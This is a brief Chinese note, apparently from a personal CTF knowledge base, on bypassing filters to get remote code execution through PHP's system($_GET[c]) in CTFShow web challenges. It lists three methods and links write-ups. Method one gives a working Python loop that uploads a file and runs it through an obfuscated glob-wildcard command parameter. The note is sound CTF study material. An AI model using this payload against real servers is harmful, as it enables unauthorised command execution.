tags:: CTF/RCE

- # 参考
	- [[CTF/WP/CTFShow/web55]]
- # 方式一
	- 对于这样的语句：`system($_GET[c]);`
	- 可以执行上传的文件缓存
	- ```python
	  while True:
	  r = requests.post(
	      url,
	      params = {
	          "c": ". /[_-{][_-{][_-{]/[_-{][_-{][_-{]?????[@-[]"
	      },
	      files={
	          "file":("a.txt", "cat flag.php")
	      }
	  )
	  if r.text:
	      break
	  
	  print(r.text)
	  ```
- # 方式二
	- 使用异或、取反等操作
	- {{embed ((63bc02d6-35cc-4fb7-9f4e-21386299fd6f))}}
- # 方式三
	- [[CTF/WP/CTFShow/web57]]